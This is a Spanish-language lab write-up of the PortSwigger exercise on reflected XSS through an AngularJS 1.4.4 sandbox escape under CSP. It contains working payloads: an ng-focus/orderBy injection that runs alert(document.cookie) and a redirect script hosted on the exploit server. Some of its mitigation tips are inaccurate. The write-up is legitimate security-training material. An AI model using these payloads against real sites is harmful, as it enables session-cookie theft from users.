---
title: "Reflected XSS with AngularJS sandbox escape and CSP"
platform: "PortSwigger"
os: "Windows"
difficulty: "Insane"
ip: "10.10.10.XXX"
slug: "reflected-xss-with-angularjs-sandbox-escape-and-csp"
author: "Z4k7"
date: "2026-04-27"
year: "2026"
status: "pwned"
tags:
  - "XSS"
  - "Reflected"
  - "AngularJS"
  - "Sandbox"
techniques:
  - "AngularJS Sandbox Escape"
  - "Filter Chain Abuse"
  - "CSP Bypass via Framework"
tools:
  - "BurpSuite"
  - "Exploit Server"
flags_list:
  - label: "cookie"
    value: "Obtenida mediante alert(document.cookie)"
summary: "Laboratorio de XSS Reflejado protegido por Content Security Policy y que utiliza AngularJS versión vulnerable (1.4.4). La solución requiere escapar del sandbox de AngularJS usando una cadena de filtros que abusa de la función orderBy para ejecutar código arbitrario sin violar la CSP. El bypass se logra explotando cómo AngularJS evalúa expresiones dentro de filtros.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio utiliza CSP y AngularJS.
          Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que evite CSP, escape del entorno aislado de AngularJS y genere alertas. `document.cookie`.

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP/file-20260427121559376.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Ingresamos en el apartado de search para consultar el comportamiento de la web y validar si contamos con algún script que nos pueda brindar información sobre el comportamiento de la web.
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP/file-20260427121704406.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Consultando el código fuente de la web contamos con una librería
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          <script type="text/javascript" src="/resources/js/angular_1-4-4.js"></script>
      - kind: "note"
        text: |
          Detallando el objetivo del laboratorio nos menciona que validemos el CSP de la web en la cual podemos evidenciar que efectivamente contamos con una posible afectación entre las CSP
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP/file-20260428175317615.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "AngularJS versión 1.4.4 tiene un sandbox vulnerable. El sandbox intenta prevenir acceso a funciones globales como `Function`, `constructor`, `eval`. Sin embargo, ciertos filtros y objetos pueden ser explotados para escapar. La CSP `script-src 'self'` bloquea scripts inline, pero AngularJS evalúa expresiones dinámicamente, lo que puede bypassear la CSP."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          El CSP configurado (`script-src 'self'`) bloquea `<script>` inline y externos, pero AngularJS evalúa expresiones dentro de atributos como `ng-focus`. Esto abre la puerta a vectores de ejecución que no dependen de `<script>`.
      - kind: "code"
        lang: "HTML"
        code: |
          <input id=x ng-focus=$event.path|orderBy:'(y=alert)(1)'>
      - kind: "note"
        text: |
          Elemento interactivo
      - kind: "bullet"
        text: "<input> puede recibir foco."
      - kind: "bullet"
        text: "El atributo ng-focus indica que AngularJS debe evaluar una expresión cuando el campo recibe foco."
      - kind: "note"
        text: |
          Uso de `$event.path`
      - kind: "bullet"
        text: "$event es el objeto del evento de foco."
      - kind: "bullet"
        text: ".path se pasa como entrada al filtro orderBy."
      - kind: "note"
        text: |
          Filtro `orderBy`
      - kind: "bullet"
        text: "Normalmente ordena listas según una clave."
      - kind: "bullet"
        text: "Aquí se le pasa la cadena '(y=alert)(1)'."
      - kind: "bullet"
        text: "AngularJS convierte esa cadena en una función de ordenamiento."
      - kind: "note"
        text: |
          Evaluación de la cadena
      - kind: "bullet"
        text: "La cadena se interpreta como expresión dentro del motor de AngularJS."
      - kind: "bullet"
        text: "(y=alert)(1) asigna alert a y y lo invoca con argumento 1."
      - kind: "bullet"
        text: "Resultado: se ejecuta alert(1)."
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP/file-20260428185653492.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "La técnica funciona porque: 1. CSP bloquea `<script>` inline, pero no controla la evaluación interna de AngularJS 2. AngularJS vulnerable convierte cadenas en funciones y las ejecuta 3. El filtro `orderBy` es un vector conocido para sandbox escape 4. `$event.path` proporciona un objeto que el filtro puede procesar 5. El `alert` se dispara sin necesidad de violar directamente las reglas de CSP"

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          El payload que escapa del sandbox de AngularJS es:
      - kind: "code"
        lang: "HTML"
        code: |
          <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
      - kind: "note"
        text: |
          Desglosando el payload:
      - kind: "bullet"
        text: "<input> — elemento HTML que puede recibir foco"
      - kind: "bullet"
        text: "id=x — identificador para referencia"
      - kind: "bullet"
        text: "ng-focus — directiva de AngularJS que se evalúa cuando el elemento recibe foco"
      - kind: "bullet"
        text: "$event.composedPath() — método que retorna un array de elementos en el path del evento"
      - kind: "bullet"
        text: "|orderBy: — filtro de AngularJS"
      - kind: "bullet"
        text: "'(z=alert)(document.cookie)' — cadena que AngularJS interpreta como función"
      - kind: "note"
        text: |
          Cuando el usuario (o el navegador automáticamente) enfoca el input:
          1. Se dispara el evento `ng-focus`
          2. AngularJS evalúa `$event.composedPath()|orderBy:'(z=alert)(document.cookie)'`
          3. El filtro `orderBy` recibe la cadena como comparador
          4. AngularJS genera una función: `function(a,b){return a<b}`... pero modifica para incluir nuestra expresión
          5. `(z=alert)` asigna la función `alert` a `z`
          6. `(document.cookie)` invoca `alert` con el argumento `document.cookie`
          7. Se ejecuta `alert(document.cookie)`
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP/file-20260428185653492.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El bypass de CSP ocurre porque: - CSP `script-src 'self'` previene `<script>` inline - Pero no previene que AngularJS evalúe expresiones dinámicamente - AngularJS es ejecutable por el navegador (cumple CSP) - Las expresiones dentro de AngularJS se evalúan en el contexto de la página - No hay encapsulación de sandbox - AngularJS accede al scope global"

  - id: "exploit"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Ingresamos en el apartado de `Go to Exploit Server` en dicho apartado nos permite simular un servidor atacante.
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          <script>
          location='https://0a1f008c04c93ccd825324cf00f00026.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
          </script>
      - kind: "note"
        text: |
          Una vez la víctima accede al servidor de exploits:
          1. El navegador redirige a la URL del laboratorio con el payload injected
          2. AngularJS procesa la entrada en la parámetro `search`
          3. El payload se refleja en el HTML
          4. AngularJS renderiza el `<input>` con la directiva `ng-focus`
          5. El fragmento `#x` causa que el navegador enfoque el elemento con `id=x`
          6. Se dispara el evento `ng-focus`
          7. AngularJS evalúa el filtro `orderBy` con nuestra expresión
          8. `alert(document.cookie)` se ejecuta
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP/file-20260428185906748.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Confirmación: El servidor de exploits confirma que la víctima ejecutó el payload.
      - kind: "image"
        src: "assets/images/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP/file-20260428185942742.jpg"
        caption: "Evidencia técnica"

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "cookie"
        value: "Obtenida mediante alert(document.cookie)"

lessons:
  - 'AngularJS versión 1.4.4 tiene vulnerabilidades de sandbox escape conocidas'
  - 'El filtro `orderBy` puede ser explotado para evaluar expresiones arbitrarias'
  - 'La evaluación dinámica en frameworks es un vector de ataque incluso con CSP restrictiva'
  - 'CSP que bloquea scripts inline no protege contra evaluación dinámica por frameworks'
  - 'Los fragmentos URL (`#x`) pueden usarse para auto-enfocar elementos y disparar eventos'
  - 'Las directivas como `ng-focus`, `ng-click` evalúan expresiones en el scope de AngularJS'
  - 'La combinación de `$event` + filtro de AngularJS puede bypassear restricciones de ejecución'
mitigation:
  - 'Actualizar AngularJS a una versión moderna (1.6+ o migrar a Angular 2+)'
  - 'Si debe usarse AngularJS 1.4, aplicar parches de seguridad disponibles'
  - 'Usar `ng-sanitize` para validar expresiones en directivas'
  - 'Implementar CSP más restrictiva: `script-src ''nonce-RANDOM''`'
  - 'Validar entrada en servidor y rechazar payloads sospechosos'
  - 'Usar `$sce` (Strict Contextual Escaping) para validar contenido dinámico'
  - 'Evitar directivas que evalúan expresiones en atributos (`ng-focus`, `ng-click`, `ng-bind`)'
  - 'Usar `Content-Security-Policy: upgrade-insecure-requests` para forzar HTTPS'
  - 'Considerar frameworks más seguros (React, Vue, Angular moderno)'
---
